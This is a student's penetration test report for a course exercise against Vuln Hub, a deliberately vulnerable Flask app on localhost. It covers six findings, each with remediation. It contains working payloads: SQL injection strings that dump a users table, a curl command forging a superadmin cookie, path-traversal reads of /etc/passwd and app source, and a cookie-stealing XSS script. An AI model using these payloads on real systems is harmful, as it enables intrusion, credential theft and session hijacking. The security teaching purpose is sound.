# Vuln Hub Penetration Test Report

**Target:** Vuln Hub (Flask practice application), `http://127.0.0.1:5000`
**Engagement:** INF601 Mini Project 4 — Track A (Cybersecurity)
**Tester:** Chase Coble (FHSU username: `clcoble`)
**Date:** October 10, 2026

---

## 1. Authorization and Scope Statement

I, Chase Coble, performed this assessment against **Vuln Hub**, a
deliberately vulnerable Flask application distributed as part of the
INF601 Mini Project 4 starter materials, running locally on my own
machine and bound to `127.0.0.1:5000`. Vuln Hub was seeded with
`FLAG_SEED=clcoble` for this assignment.

This test was authorized by the course instructor as a graded
educational exercise. Testing was limited strictly to this target.
No other host, service, or system — on this machine or any network —
was probed, scanned, or interacted with as part of this engagement.
The target was never exposed beyond `127.0.0.1`.

All testing was performed using standard HTTP tooling (`curl`) against
the running application. No destructive actions, denial-of-service
techniques, or modifications to the host system outside the
application's own data (its SQLite database and guestbook comments)
were performed.

## 2. Executive Summary

Vuln Hub contains six distinct, critical-to-high-severity
vulnerabilities, all of which were successfully identified and
exploited during this engagement. In combination, these flaws allow a
completely unauthenticated attacker to:

- Bypass authentication entirely and extract the full user database,
  including all usernames and passwords (SQL Injection).
- Read any other user's private data by guessing sequential IDs
  (IDOR).
- Grant themselves an administrative role that does not even exist in
  the database, with a single forged cookie value (Broken
  Authorization).
- Read arbitrary files anywhere on the filesystem the application
  process can access — including the application's own source code
  (Path Traversal).
- Retrieve a backup file left in an unauthenticated, disclosed
  directory, exposing further secrets (Sensitive Data Exposure).
- Persist attacker-controlled JavaScript in a public guestbook that
  executes in the context of any visitor, including a privileged
  "admin" session (Stored Cross-Site Scripting).

All six findings were confirmed by capturing a unique flag token for
each, validated against `check_flags.py` with the correct
`FLAG_SEED`:

```
FLAG{idor_407e97ee190c}        VALID (idor)
FLAG{sqli_e845a880e16c}        VALID (sqli)
FLAG{authz_fbd5823a9865}       VALID (authz)
FLAG{traversal_49e86abc62ee}   VALID (traversal)
FLAG{exposure_a92a0c94e6e1}    VALID (exposure)
FLAG{xss_efa59c352162}         VALID (xss)

6/6 flags valid for username clcoble
```

No vulnerability required credentials beyond the publicly posted test
account (`alice` / `password123`) that Vuln Hub's own homepage
provides, and most required none at all.

## 3. Methodology

Testing followed a standard black-box web application methodology:

1. **Recon** — crawled linked navigation routes from the homepage,
   then probed a list of typical unlinked targets (`/robots.txt`,
   `/admin`, `/logout`, etc.) by HTTP status code. Reviewed response
   headers, cookies, and redirect targets.
2. **Mapping the attack surface** — the homepage itself names all six
   challenge categories and gives a thematic hint for each, which
   shaped the order of investigation. `/robots.txt` disclosed a
   `/backups/` path not linked anywhere in the UI.
3. **Exploitation** — each finding was investigated and exploited
   individually, starting from the lowest-effort observations (an
   unsigned, human-readable session cookie) and working toward more
   involved exploitation (SQL injection, UNION-based data extraction).
4. **Verification** — one vulnerability (path traversal) was used to
   retrieve the application's own source code (`app.py`) over HTTP,
   which clarified the exact mechanics of the remaining findings
   (notably the simulated "admin bot" behind the stored-XSS
   challenge) and made exploitation of those findings more precise.
   Where source review informed a finding, this report says so
   explicitly — see each finding's **PoC note**.
5. **Validation** — every captured flag was checked against the
   grader (`check_flags.py`) to confirm correctness before reporting.

A full, timestamped transcript of every prompt, action, and decision
made during this engagement is maintained in `AGENTIC_LOG.md` in this
repository, including dead ends and failed attempts (e.g. the
external-listener tests that did not fire during the XSS
investigation). This report's PoC sections summarize the successful
exploitation path for each finding; `AGENTIC_LOG.md` has the complete
record including what was tried and ruled out.

---

## 4. Findings

Findings are presented in the order they were exploited, not strictly
by severity. A severity summary table is in Section 5.

### 4.1 SQL Injection — Login Authentication Bypass & Full Database Dump

**Severity: Critical**

**Classification:** CWE-89 (Improper Neutralization of Special
Elements used in an SQL Command — 'SQL Injection') · OWASP Top 10
2021: A03:2021 – Injection

**Location:** `POST /login`, `username` field

**Description:** The login handler builds its SQL query by directly
string-formatting the submitted `username` and `password` into a
`SELECT` statement, with no parameterization and no input
sanitization:

```python
query = (
    "SELECT id, username, role FROM users "
    "WHERE username = '%s' AND password = '%s'" % (username, password)
)
row = get_db().execute(query).fetchone()
```

This allows an attacker to inject arbitrary SQL into the `WHERE`
clause, both to bypass authentication and to extract data from any
table in the database via `UNION SELECT`.

**Proof of Concept:**

1. **Authentication bypass** — submitting a comment-terminated
   username with any password logs in as `admin` with no credentials:

   ```
   POST /login
   username=admin' -- &password=x
   ```

   Response: `302 Found`, `Location: /dashboard`,
   `Set-Cookie: auth=YWRtaW46YWRtaW4=` (base64 of `admin:admin`).
   `' OR '1'='1' -- ` as the username has the identical effect.

2. **Flag retrieval** — the resulting admin session's dashboard
   reveals the flag directly:

   ```
   GET /dashboard   (with the auth cookie from step 1)
   → "Nice work bypassing the login. FLAG{sqli_e845a880e16c}"
   ```

3. **Full database dump via UNION injection** — fingerprinted the
   query's column count by submitting `' UNION SELECT 1,2,3 -- ` as
   the username (3 columns succeeded; 2/4/5 did not), then used the
   fact that the resulting session cookie reflects columns 2 and 3 of
   the returned row as `username:role` to exfiltrate arbitrary query
   results through the `/dashboard` "Signed in as" field:

   ```
   username=' UNION SELECT 1, (SELECT group_concat(name) FROM sqlite_master WHERE type='table'), 3 -- 
   → tables: users, messages, comments

   username=' UNION SELECT 1, (SELECT group_concat(name) FROM pragma_table_info('users')), 3 -- 
   → columns: id, username, password, role, secret_note

   username=' UNION SELECT 1, (SELECT group_concat(id||'|'||username||'|'||password||'|'||role||'|'||secret_note, char(10)) FROM users), 3 -- 
   ```

   Result — the entire `users` table, dumped through the login form
   alone:

   | id | username | password | role |
   |---|---|---|---|
   | 1 | admin | `mDIpCq0ixSUa65leZw3GNQ` | admin |
   | 2 | alice | `password123` (plaintext) | user |
   | 3 | bob | `qwerty2024` (plaintext) | user |

**PoC note:** All of the above was obtained purely through the login
form; no source code review was needed for this finding.

**Impact:** Complete authentication bypass and full compromise of the
user database, including every account's credentials, via a single
unauthenticated HTTP endpoint.

**Remediation:**
- Use parameterized queries exclusively (e.g.
  `execute("SELECT ... WHERE username = ? AND password = ?", (username, password))`).
  Never interpolate user input into SQL strings.
- Hash passwords (e.g. bcrypt/argon2) rather than storing them in
  plaintext — two of the three dumped accounts had plaintext
  passwords, which is itself a sensitive-data-exposure issue
  independent of the injection.
- Apply least-privilege database permissions so that even a
  successful injection cannot read unrelated tables.

---

### 4.2 Insecure Direct Object Reference (IDOR) — Private Messages

**Severity: High**

**Classification:** CWE-639 (Authorization Bypass Through
User-Controlled Key) · OWASP Top 10 2021: A01:2021 – Broken Access
Control

**Location:** `GET /messages/<id>`

**Description:** The message detail route fetches a message purely by
its numeric ID, performing no check that the requesting user actually
owns that message:

```python
row = get_db().execute(
    "SELECT id, owner, title, body FROM messages WHERE id = ?", (msg_id,)
).fetchone()
```

Any authenticated session — including the public `alice` test account
— can read any other user's message by changing the ID in the URL.

**Proof of Concept:**

```
POST /login   username=alice&password=password123
GET /messages            → alice owns messages #4 and #5 only
GET /messages/1           (authenticated as alice)
```

Response:

```
#1 — Onboarding secret
To: admin
Internal only. Do not share. FLAG{idor_407e97ee190c}
```

**PoC note:** Found entirely through black-box testing — simply
trying adjacent IDs while mapping the message ID space during initial
recon. No source code was needed or used for this finding.

**Impact:** Any logged-in user (even the lowest-privilege account
Vuln Hub hands out publicly) can read every other user's private
messages, including internal admin communications.

**Remediation:**
- Add an ownership check to the query:
  `WHERE id = ? AND owner = ?` using the requesting session's
  username.
- Return 403/404 indistinguishably for messages that exist but aren't
  owned by the requester, to avoid leaking existence via status codes.

---

### 4.3 Broken Authorization — Forgeable Session Cookie / `/vault`

**Severity: Critical**

**Classification:** CWE-284 (Improper Access Control), also CWE-345
(Insufficient Verification of Data Authenticity — the cookie's
integrity is never checked) · OWASP Top 10 2021: A01:2021 – Broken
Access Control

**Location:** Session mechanism (`auth` cookie), enforced at `GET /vault`

**Description:** Vuln Hub's "authentication" is a single cookie
containing unsigned, unencrypted base64 of `username:role`:

```python
def set_auth(resp, username, role):
    token = base64.b64encode(("%s:%s" % (username, role)).encode()).decode()
    resp.set_cookie("auth", token)

def current_user():
    token = request.cookies.get("auth")
    username, role = base64.b64decode(token).decode().split(":", 1)
    return {"username": username, "role": role}
```

There is no HMAC, signature, or server-side session store backing
this value — the server trusts whatever the client presents. `/vault`
checks only that `role == "superadmin"`, a role that **no account in
the database actually has** (confirmed via the SQL injection dump in
4.1 — only `admin`/`user` roles exist).

**Proof of Concept:**

```bash
curl -b "auth=$(printf 'x:superadmin' | base64)" http://127.0.0.1:5000/vault
```

No prior login, no valid account, no credentials of any kind. Response:

```
HTTP/1.1 200 OK
Access granted, superadmin.
FLAG{authz_fbd5823a9865}
```

**PoC note:** Fully black-box — the mechanism was inferred purely
from observing the cookie's base64 structure after a normal login,
and confirmed by forging a value for a role/user combination that was
never issued by the server.

**Impact:** Complete privilege escalation to the highest role in the
application with zero authentication. This is a strictly stronger
bypass than the SQL injection in 4.1 — no request to `/login` is even
necessary.

**Remediation:**
- Use Flask's signed session (`flask.session`, backed by a secret
  `SECRET_KEY`) or a signed/encrypted token (e.g. a JWT with HMAC/RSA
  verification) instead of a bare, unsigned cookie.
- Never derive authorization decisions from client-supplied data that
  isn't cryptographically verified server-side.

---

### 4.4 Path Traversal / Arbitrary File Read — `/download`

**Severity: Critical**

**Classification:** CWE-22 (Improper Limitation of a Pathname to a
Restricted Directory — 'Path Traversal'), also CWE-73 (External
Control of File Name or Path) · OWASP Top 10 2021: A01:2021 – Broken
Access Control

**Location:** `GET /download?file=`

**Description:** The download handler joins the `file` query
parameter directly onto a base directory with no validation at all —
not even a check that the result stays within that directory:

```python
name = request.args.get("file", "welcome.txt")
path = os.path.join(APP_DIR, "public", name)
with open(path, "r") as fh:
    data = fh.read()
```

Because `os.path.join` treats an absolute path in `name` as replacing
the base entirely, and performs no `..`-sequence filtering, `file` can
reference **any** file the application process (running as `root` in
this deployment) can read.

**Proof of Concept:**

1. **Baseline absolute-path read** (no traversal sequence even
   needed):

   ```
   GET /download?file=/etc/passwd
   → full contents of /etc/passwd
   ```

2. **Classic traversal** confirms the same with relative dot-segments:

   ```
   GET /download?file=../../../../../../etc/passwd
   → identical result
   ```

3. **Severity escalation — reading the application's own source**,
   using the `/proc/self/cwd/` trick (the running process's own
   working-directory symlink, which resolves for whatever process
   handles the `open()` call — here, the Flask app itself):

   ```
   GET /download?file=/proc/self/cwd/app.py
   → the complete 413-line app.py source
   ```

4. **Flag retrieval** — the application plants a dedicated file for
   this exact challenge outside the intended `public/` directory:

   ```
   GET /download?file=../private/employee_notes.txt
   ```

   Response:

   ```
   CONFIDENTIAL - employees only
   If you can read this through the download endpoint, the path filter failed.
   FLAG{traversal_49e86abc62ee}
   ```

**PoC note:** The core vulnerability (steps 1–3) was proven entirely
black-box, before any source code was read. The specific filename used
in step 4 (`private/employee_notes.txt`) was identified by reading
`app.py` — itself retrieved via this same vulnerability in step 3, not
through any access outside the application. In a real-world
engagement without this shortcut, the same file would typically be
located via directory/filename brute-forcing with a traversal-aware
wordlist.

**Impact:** Full arbitrary file disclosure on the host, limited only
by the privileges of the application process — which here runs as
`root`, meaning this bug alone exposes essentially the entire
filesystem. Reading the application's own source code also
materially aided discovery of other findings (see 4.6).

**Remediation:**
- Never build filesystem paths from unsanitized user input. Use an
  allow-list of permitted filenames, or an opaque ID → filename
  mapping that never touches the filesystem directly with client
  input.
- If a directory of downloadable files is required, resolve the final
  path with `os.path.realpath()` and verify it is still a descendant
  of the intended base directory before opening it.
- Run the application with the minimum OS privileges it needs — never
  as `root`.

---

### 4.5 Sensitive Data Exposure — Unauthenticated Backup Directory

**Severity: High**

**Classification:** CWE-200 (Exposure of Sensitive Information to an
Unauthorized Actor), and more specifically CWE-530 (Exposure of
Backup File to an Unauthorized Control Sphere — verified against
cwe.mitre.org) · OWASP Top 10 2021: A05:2021 – Security Misconfiguration
(secondary: A01:2021 – Broken Access Control, since the route also
enforces no access control at all)

**Location:** `GET /backups/<name>`, disclosed via `/robots.txt`

**Description:** A second, dedicated route serves any file inside a
`backups/` directory with no authentication and no access control:

```python
@app.route("/backups/<path:name>")
def backups(name):
    path = os.path.join(APP_DIR, "backups", name)
    with open(path, "r") as fh:
        data = fh.read()
    return Response(data, mimetype="text/plain")
```

The directory's existence is disclosed by the site's own
`robots.txt` — intended to tell web crawlers not to index it, but
functioning instead as a signpost for an attacker, since the path is
never actually protected:

```
GET /robots.txt
→ User-agent: *
  Disallow: /backups/
```

**Proof of Concept:**

1. **Recon** — `/robots.txt` reveals `/backups/` as a path of
   interest; it is not linked anywhere in the site's navigation.

2. **Direct retrieval** of the planted backup file:

   ```
   GET /backups/vulnhub.sql.bak
   ```

   Response:

   ```
   -- database backup (should NOT be world-readable)
   -- left in /backups/ by mistake
   INSERT INTO secrets VALUES ('FLAG{exposure_a92a0c94e6e1}');
   ```

3. **Confirming the route is independently traversal-vulnerable**
   (not just serving one known filename): a direct `../app.py` segment
   is normalized away by the web framework's own routing layer before
   reaching the application (`404`), but a URL-encoded equivalent
   survives routing and reaches the vulnerable `os.path.join` call:

   ```
   GET /backups/..%2fapp.py
   → full app.py source again
   ```

   This shows the exposure is not limited to one hardcoded filename —
   the route itself has no path sanitization, identical to the bug in
   4.4.

**PoC note:** The route and directory were found entirely
black-box (via `robots.txt`, before any source review). The specific
backup filename (`vulnhub.sql.bak`) was identified via source code
review; step 3 independently confirms the route's vulnerability
without relying on that filename.

**Impact:** Disclosure of a database backup file (and, via the same
route's traversal bug, arbitrary files) with no authentication
whatsoever. In a real deployment this directory could contain actual
database contents, credentials, or configuration secrets.

**Remediation:**
- Never serve a "disallowed" directory directly — `robots.txt` is a
  crawler courtesy, not an access control. Remove the route entirely
  or put it behind authentication.
- Don't leave backup artifacts inside the web root at all; store them
  outside any directory the application serves.
- Apply the same path-sanitization fix described in 4.4 to this route.

---

### 4.6 Stored Cross-Site Scripting (XSS) — Guestbook

**Severity: Medium-High**

**Classification:** CWE-79 (Improper Neutralization of Input During
Web Page Generation — 'Cross-site Scripting') · OWASP Top 10 2021:
A03:2021 – Injection (XSS was folded into the Injection category in
the 2021 revision; it was its own category, A7:2017-XSS, in the 2017
edition)

**Location:** `POST /guestbook` (stored), rendered at `GET /guestbook`

**Description:** The guestbook stores visitor comments verbatim and
renders them back to every visitor — including, per the application's
own design, a simulated privileged "admin" session — with **no output
escaping**:

```python
db.execute("INSERT INTO comments (author, body) VALUES (?, ?)", (author, body))
# ...
# VULN (xss): comment bodies are rendered without escaping (see template).
return render_template("guestbook.html", user=user, rows=rows)
```

By contrast, `/dashboard`'s "Signed in as" field correctly
auto-escapes equivalent content — the guestbook template specifically
bypasses Jinja's default escaping (e.g. via a `|safe` filter),
confirming this is a targeted implementation flaw, not a global
setting.

Vuln Hub also implements a background thread that simulates a victim
("admin") browser periodically rendering the guestbook and executing
any stored script that reads `document.cookie` and sends it to a URL,
approximating real-world impact (session-cookie theft) without
shipping an actual headless browser.

**Proof of Concept:**

1. **Confirming the escaping failure** (independent of any later
   source review): posting
   `<script>alert(1)</script>` as a comment and re-fetching
   `/guestbook` anonymously returns the tag completely unescaped in
   the HTML:

   ```html
   <span class="text"><script>alert(1)</script></span>
   ```

   This alone is a complete, reproducible stored-XSS finding — any
   visitor's browser would execute this payload.

2. **Demonstrating real impact (cookie exfiltration)** — the
   application's simulated "admin bot" scans new comments for a
   `<script>` tag that reads `document.cookie` and points at a URL,
   then issues that request itself carrying its own session cookie
   (which is where the challenge's flag lives). The sink it reports
   results to is a dedicated endpoint, `/grab`:

   ```
   POST /guestbook
   comment=<script>fetch('/grab?c='+document.cookie)</script>

   (wait ~6s for the background bot's poll loop)

   GET /grab
   → c=session=admin; flag=FLAG{xss_efa59c352162}
   ```

**PoC note (full disclosure):** Step 1 (the escaping failure itself)
was proven completely black-box. Step 2's specific sink, `/grab`, was
**not** found by black-box route-guessing during this engagement — it
was identified by reading `app.py` (obtained via the path-traversal
finding in 4.4). I attempted the equivalent attack against my own
external listener twice, with the listener's reachability verified by
a manual health-check request beforehand, and received zero callbacks
both times — the simulated bot's outbound requests only succeed
same-origin (to the app's own port). This means `/grab` is the only
viable capture point in this environment regardless of discovery
method, which somewhat narrows the gap, but I'm disclosing this
plainly rather than presenting it as a clean black-box find: the
underlying vulnerability (stored, unescaped XSS) was independently
proven; the specific mechanism used to retrieve this flag's text was
located with source-code assistance.

**Impact:** Any visitor's browser executes attacker-controlled
JavaScript when viewing the guestbook. Demonstrated impact here is
simulated session-cookie theft from a privileged user; in a
production application this translates to real session hijacking,
credential theft via fake login prompts, or further attacks pivoting
off a victim's authenticated session.

**Remediation:**
- Rely on the template engine's default auto-escaping; remove
  whatever `|safe` / manual escaping bypass is applied to comment
  bodies in the guestbook template.
- If any HTML formatting in comments is genuinely required, sanitize
  with an allow-list-based HTML sanitizer (e.g. `bleach`), never
  render raw user input.
- Add a `Content-Security-Policy` header restricting script execution
  to trusted sources, as defense-in-depth even if output encoding is
  fixed.
- Mark session cookies `HttpOnly` so client-side script cannot read
  them even if an XSS bug exists.

---

## 5. Severity Summary

| # | Finding | Severity | CWE | OWASP Top 10 (2021) | Flag |
|---|---|---|---|---|---|
| 1 | SQL Injection (login bypass + DB dump) | Critical | CWE-89 | A03:2021 – Injection | `FLAG{sqli_e845a880e16c}` |
| 2 | IDOR (private messages) | High | CWE-639 | A01:2021 – Broken Access Control | `FLAG{idor_407e97ee190c}` |
| 3 | Broken Authorization (forged cookie) | Critical | CWE-284, CWE-345 | A01:2021 – Broken Access Control | `FLAG{authz_fbd5823a9865}` |
| 4 | Path Traversal (`/download`) | Critical | CWE-22, CWE-73 | A01:2021 – Broken Access Control | `FLAG{traversal_49e86abc62ee}` |
| 5 | Sensitive Data Exposure (`/backups/`) | High | CWE-200, CWE-530 (verified against cwe.mitre.org) | A05:2021 – Security Misconfiguration | `FLAG{exposure_a92a0c94e6e1}` |
| 6 | Stored XSS (guestbook) | Medium-High | CWE-79 | A03:2021 – Injection | `FLAG{xss_efa59c352162}` |

**Note on classification:** Vuln Hub is a bespoke, unpublished
teaching application, so none of these findings have (or should have)
a CVE identifier — CVEs are assigned to specific, publicly disclosed
vulnerabilities in named, versioned real-world software, not to
vulnerability *classes* in custom code. CWE (Common Weakness
Enumeration) is the correct standard for classifying the *type* of
each weakness, and OWASP Top 10 (2021) is used here for the
industry-standard risk-category mapping.

**Additional observation (not separately flagged):** two of the three
user accounts recovered via finding #1 (`alice`, `bob`) store their
passwords in plaintext. This compounds the impact of the SQL
injection and would remain a finding on its own even if the injection
were fixed, since any other means of reading that table (backup,
misconfigured admin panel, insider access) would expose usable
credentials directly.

## 6. General Recommendations

- **Parameterize all SQL.** Finding #1 alone would be eliminated by
  this single change.
- **Sign or encrypt all session/authorization state.** Findings #3
  and, to a lesser extent, the ease of forging admin access in #1 both
  stem from trusting unsigned, client-supplied identity data.
- **Never build filesystem paths from user input without
  canonicalization and an allow-list check.** This single root cause
  underlies both #4 and #5.
- **Default to output escaping and never selectively disable it**
  without a reviewed sanitizer in place (#6).
- **Enforce ownership checks on every object lookup**, not just
  authentication (#2).
- **Run the application with least privilege** — it ran as `root` in
  this environment, which turned the path traversal bug (#4) into a
  full-filesystem read rather than a contained one.

## 7. Scope Note

Per the assignment README: `check_flags.py` was run against this
environment with `FLAG_SEED=clcoble` (my own FHSU username) for the
entirety of this engagement, confirmed via the absence of any
"DEFAULT seed" warning in the grader's output. All six flags above
validated as `VALID` for this seed.

A complete, unedited chronological record of every action taken
during this engagement — including dead ends, failed attempts, and
the methodological self-check on the source-informed findings — is
maintained in `AGENTIC_LOG.md` in this repository.
